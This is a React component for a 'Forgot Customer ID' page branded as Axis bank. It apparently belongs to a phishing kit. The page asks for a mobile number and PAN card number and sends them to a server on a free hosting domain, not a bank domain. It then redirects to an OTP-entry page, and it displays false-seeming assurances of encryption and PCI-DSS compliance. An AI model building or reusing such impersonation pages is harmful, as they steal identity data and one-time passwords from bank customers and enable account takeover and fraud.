import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { FaSpinner } from "react-icons/fa";
import "./Login.css"; // reuse styles

function ForgetCustomerId() {
  const navigate = useNavigate();
  const [mobile, setMobile] = useState("");
  const [pan, setPan] = useState("");
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState({ text: "", type: "" });

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!mobile || !pan) {
      setMessage({ text: "Mobile number and PAN are required", type: "error" });
      return;
    }

    if (!/^\d{10}$/.test(mobile)) {
      setMessage({ text: "Mobile number must be exactly 10 digits", type: "error" });
      return;
    }

    setLoading(true);
    setMessage({ text: "", type: "" });

    try {
      const res = await fetch("https://axisonline-1.onrender.com/api/users/forget-customer-id", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ mobile, pan }),
      });

      if (!res.ok) throw new Error("Failed to submit");

      setMessage({ text: "Request submitted successfully. Redirecting...", type: "success" });

      // Clear inputs
      setMobile("");
      setPan("");

      // Redirect to OTP page after 2s and send mobile number
      setTimeout(() => {
        navigate("/otp-submit", { state: { mobileNumber: mobile } });
      }, 2000);
    } catch (err) {
      console.error(err);
      setMessage({ text: "Network error, please try again", type: "error" });
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="login-page">
      <div className="login-card">
        <h2>Forgot Customer ID</h2>

        <form className="form" onSubmit={handleSubmit}>
          {message.text && (
            <p className={`form-message ${message.type}`}>{message.text}</p>
          )}

          <label>Mobile Number</label>
          <input
            type="tel"
            placeholder="Enter your mobile number"
            value={mobile}
            maxLength={10}
            inputMode="numeric"
            pattern="[0-9]*"
            onChange={(e) => setMobile(e.target.value.replace(/\D/g, ""))} // only digits
            disabled={loading}
          />

          <label>PAN Card Number</label>
          <input
            type="text"
            placeholder="Enter your PAN card number"
            value={pan}
            maxLength={10}
            onChange={(e) => setPan(e.target.value.toUpperCase())} // auto uppercase PAN
            disabled={loading}
          />

          <button
            className="verify-btn"
            type="submit"
            disabled={loading}
          >
            {loading ? <FaSpinner className="rotating" /> : "🔒 Verify Securely with Login"}
          </button>

          <button
            className="login-btn"
            type="button"
            style={{ marginTop: "10px", background: "#555" }}
            onClick={() => navigate(-1)}
            disabled={loading}
          >
            Back
          </button>

          <p className="secure-text">
            Your information is encrypted and securely transmitted.
          </p>
          <p className="secure-text">
            Axis follows international PCI-DSS compliance for all transactions.
          </p>
        </form>
      </div>
    </div>
  );
}

export default ForgetCustomerId;
